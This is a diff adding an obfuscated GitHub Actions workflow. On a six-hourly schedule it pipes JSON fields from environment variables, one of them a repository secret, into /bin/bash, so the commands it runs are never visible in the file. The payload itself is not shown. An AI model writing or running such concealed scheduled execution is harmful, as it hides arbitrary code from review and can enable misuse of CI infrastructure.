@@ -1,0 +1,29 @@
+name: linjunhencheng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linjunhencheng
+        env:
+          lhyts11096: ${{ secrets.lhyts11096 }}
+        run: |
+          echo $lhyts11096 | jq -r .l1 | /bin/bash
+          echo $b18 | jq -r .nita24 | /bin/bash
+          echo $zdk77873 | jq -r .sel12 | /bin/bash
+          echo $njcmt477 | jq -r .akxxm68 | /bin/bash
+          echo $ljtwy2266 | jq -r .njeo14446 | /bin/bash
+          echo $pdjuz663 | jq -r .haxpp32 | /bin/bash
+          echo $knnij4 | jq -r .oareh877 | /bin/bash
+          echo $ap028 | jq -r .ez0318 | /bin/bash
+          echo $wwofx5 | jq -r .cli507 | /bin/bash
+          echo $znyj876 | jq -r .yeyfz25 | /bin/bash
+          echo $rb0859 | jq -r .ojx0087 | /bin/bash
+          echo $vwg64104 | jq -r .ndvc81 | /bin/bash
+          echo $x66 | jq -r .oq544 | /bin/bash
+          echo $qqxu6970 | jq -r .e88212 | /bin/bash
+
